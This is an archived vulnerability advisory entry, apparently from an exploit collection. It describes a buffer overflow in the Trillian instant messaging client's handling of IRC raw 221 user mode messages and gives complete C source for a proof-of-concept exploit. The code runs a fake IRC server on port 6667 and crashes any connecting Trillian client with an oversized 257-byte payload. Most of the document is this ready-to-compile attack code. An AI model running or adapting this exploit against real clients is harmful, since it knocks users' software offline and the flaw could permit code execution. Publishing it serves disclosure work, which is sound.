source: http://www.securityfocus.com/bid/5769/info

Trillian is an instant messaging client that supports a number of protocols (including IRC, ICQ, MSN). It is available for Microsoft Windows systems. 

It has been reported that Trillian does not perform adequate bounds checking when receiving IRC raw user mode messages. When a Trillian client receives an instruction from a server for a raw user mode change containing 251 or more bytes of data, a buffer overflow occurs. This could result in denial of service, or the execution of arbitrary attacker supplied instructions.

/* Trillian-221.c
   Author: Lance Fitz-Herbert
   Contact: IRC: Phrizer, DALnet - #KORP
            ICQ: 23549284

   Exploits the Trillian "Raw 221" Flaw.
   Tested On Version .74 and .73
   Compiles with Borland 5.5 Commandline Tools.

   This Example Will Just DoS The Trillian Client,
   not particularly useful, just proves the flaw exists.

   Greets: AnAh, Hooves.
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>

SOCKET s;

#define MSG1 ":server 221 target "

int main() {

        SOCKET TempSock = SOCKET_ERROR;
        WSADATA WsaDat;
        SOCKADDR_IN Sockaddr;
        int nRet;
        char payload[257];

        printf("\nTrillian Raw 221 Flaw\n");
        printf("---------------------\n");
        printf("Coded By Lance Fitz-Herbert (Phrizer, DALnet/#KORP)\n");
        printf("Tested On Version .74 and .73\nListening On Port 6667 For 
Connections\n\n");

        if (WSAStartup(MAKEWORD(1, 1), &WsaDat) != 0) {
                printf("ERROR: WSA Initialization failed.");
                return 0;
        }


        /* Create Socket */
        s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
                printf("ERROR: Could Not Create Socket. Exiting\n");
                WSACleanup();
                return 0;
        }

        Sockaddr.sin_port = htons(6667);
        Sockaddr.sin_family = AF_INET;
        Sockaddr.sin_addr.s_addr  = INADDR_ANY;


        nRet = bind(s, (LPSOCKADDR)&Sockaddr, sizeof(struct sockaddr));
        if (nRet == SOCKET_ERROR) {
                printf("ERROR Binding Socket");
                WSACleanup();
                return 0;
        }

        /* Make Socket Listen */
        if (listen(s, 10) == SOCKET_ERROR) {
                printf("ERROR: Couldnt Make Listening Socket\n");
                WSACleanup();
                return 0;
        }

        while (TempSock == SOCKET_ERROR) {
              TempSock = accept(s, NULL, NULL);
        }

        printf("Client Connected, Sending Payload\n");

        send(TempSock,MSG1,strlen(MSG1),0);
        memset(payload,'A',257);
        send(TempSock,payload,strlen(payload),0);
        send(TempSock,"\n",1,0);

        printf("Exiting\n");
        sleep(100);
        WSACleanup();
        return 0;
}